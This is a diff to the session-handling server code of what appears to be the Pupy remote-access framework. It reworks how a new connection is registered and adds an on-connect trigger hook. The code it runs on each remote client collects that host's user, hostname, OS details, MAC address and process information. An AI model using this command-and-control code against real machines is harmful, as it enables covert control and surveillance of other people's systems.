@@ -26,6 +26,7 @@ from .PupyCmd import color_real
 from .PupyCategories import PupyCategories
 from network.conf import transports
 from pupylib.utils.rpyc_utils import obtain
+import triggers
 
 try:
 	import ConfigParser as configparser
@@ -64,100 +65,101 @@ class PupyServer(threading.Thread):
 		self.handler_registered.set()
 
 	def add_client(self, conn):
-		with self.clients_lock:
-			conn.execute(textwrap.dedent(
-			"""
-			import platform
-			import getpass
-			import uuid
-			import sys
-			import os
-			import locale
-			os_encoding = locale.getpreferredencoding() or "utf8"
+		pc=None
+		conn.execute(textwrap.dedent(
+		"""
+		import platform
+		import getpass
+		import uuid
+		import sys
+		import os
+		import locale
+		os_encoding = locale.getpreferredencoding() or "utf8"
 
-			def GetUserName():
-				from ctypes import windll, WinError, create_string_buffer, byref, c_uint32, GetLastError
-				DWORD = c_uint32
-				nSize = DWORD(0)
-				windll.advapi32.GetUserNameA(None, byref(nSize))
-				error = GetLastError()
-				
-				ERROR_INSUFFICIENT_BUFFER = 122
-				if error != ERROR_INSUFFICIENT_BUFFER:
-					raise WinError(error)
-				
-				lpBuffer = create_string_buffer('', nSize.value + 1)
-				
-				success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
-				if not success:
-					raise WinError()
-				return lpBuffer.value
-
-			def get_uuid():
-				user=None
-				node=None
-				plat=None
-				release=None
-				version=None
-				machine=None
-				macaddr=None
-				pid=None
-				proc_arch=None
-				proc_path=sys.executable
-				try:
-					user=getpass.getuser().decode(encoding=os_encoding).encode("utf8")
-					if sys.platform=="win32":
-						user=GetUserName().decode(encoding=os_encoding).encode("utf8")
-				except Exception as e:
-					user=str(e)
-					pass
-				try:
-					node=platform.node().decode(encoding=os_encoding).encode("utf8")
-				except Exception:
-					pass
-				try:
-					version=platform.platform()
-				except Exception:
-					pass
-				try:
-					plat=platform.system()
-				except Exception:
-					pass
-				try:
-					from kivy.utils import platform as kivy_plat#support for android
-					plat=bytes(kivy_plat)
-				except ImportError:
-					pass
-				try:
-					release=platform.release()
-				except Exception:
-					pass
-				try:
-					version=platform.version()
-				except Exception:
-					pass
-				try:
-					machine=platform.machine()
-				except Exception:
-					pass
-				try:
-					pid=os.getpid()
-				except Exception:
-					pass
-				try:
-					proc_arch=platform.architecture()[0]
-				except Exception:
-					pass
-				try:
-					macaddr=uuid.getnode()
-					macaddr=':'.join(("%012X" % macaddr)[i:i+2] for i in range(0, 12, 2))
-				except Exception:
-					pass
-				return (user, node, plat, release, version, machine, macaddr, pid, proc_arch, proc_path)
-				"""))
-			l=conn.namespace["get_uuid"]()
+		def GetUserName():
+			from ctypes import windll, WinError, create_string_buffer, byref, c_uint32, GetLastError
+			DWORD = c_uint32
+			nSize = DWORD(0)
+			windll.advapi32.GetUserNameA(None, byref(nSize))
+			error = GetLastError()
 			
-			self.clients.append(PupyClient.PupyClient({
+			ERROR_INSUFFICIENT_BUFFER = 122
+			if error != ERROR_INSUFFICIENT_BUFFER:
+				raise WinError(error)
+			
+			lpBuffer = create_string_buffer('', nSize.value + 1)
+			
+			success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
+			if not success:
+				raise WinError()
+			return lpBuffer.value
+
+		def get_uuid():
+			user=None
+			node=None
+			plat=None
+			release=None
+			version=None
+			machine=None
+			macaddr=None
+			pid=None
+			proc_arch=None
+			proc_path=sys.executable
+			try:
+				user=getpass.getuser().decode(encoding=os_encoding).encode("utf8")
+				if sys.platform=="win32":
+					user=GetUserName().decode(encoding=os_encoding).encode("utf8")
+			except Exception as e:
+				user=str(e)
+				pass
+			try:
+				node=platform.node().decode(encoding=os_encoding).encode("utf8")
+			except Exception:
+				pass
+			try:
+				version=platform.platform()
+			except Exception:
+				pass
+			try:
+				plat=platform.system()
+			except Exception:
+				pass
+			try:
+				from kivy.utils import platform as kivy_plat#support for android
+				plat=bytes(kivy_plat)
+			except ImportError:
+				pass
+			try:
+				release=platform.release()
+			except Exception:
+				pass
+			try:
+				version=platform.version()
+			except Exception:
+				pass
+			try:
+				machine=platform.machine()
+			except Exception:
+				pass
+			try:
+				pid=os.getpid()
+			except Exception:
+				pass
+			try:
+				proc_arch=platform.architecture()[0]
+			except Exception:
+				pass
+			try:
+				macaddr=uuid.getnode()
+				macaddr=':'.join(("%012X" % macaddr)[i:i+2] for i in range(0, 12, 2))
+			except Exception:
+				pass
+			return (user, node, plat, release, version, machine, macaddr, pid, proc_arch, proc_path)
+			"""))
+		l=conn.namespace["get_uuid"]()
+		
+		with self.clients_lock:
+			pc=PupyClient.PupyClient({
 				"id": self.current_id,
 				"conn" : conn,
 				"user" : l[0],
@@ -173,14 +175,16 @@ class PupyServer(threading.Thread):
 				"address" : conn._conn._config['connid'].split(':')[0],
 				"launcher" : conn.get_infos("launcher"),
 				"launcher_args" : obtain(conn.get_infos("launcher_args")),
-			}, self))
+			}, self)
+			self.clients.append(pc)
 			if self.handler:
 				addr = conn.modules['pupy'].get_connect_back_host()
 				server_ip, server_port = addr.rsplit(':', 1)
 				client_ip, client_port = conn._conn._config['connid'].split(':')
 				self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(self.current_id, server_ip, server_port, client_ip, client_port))
-
 			self.current_id += 1
+		if pc:
+			triggers.on_connect(pc)
 
 	def remove_client(self, client):
 		with self.clients_lock:
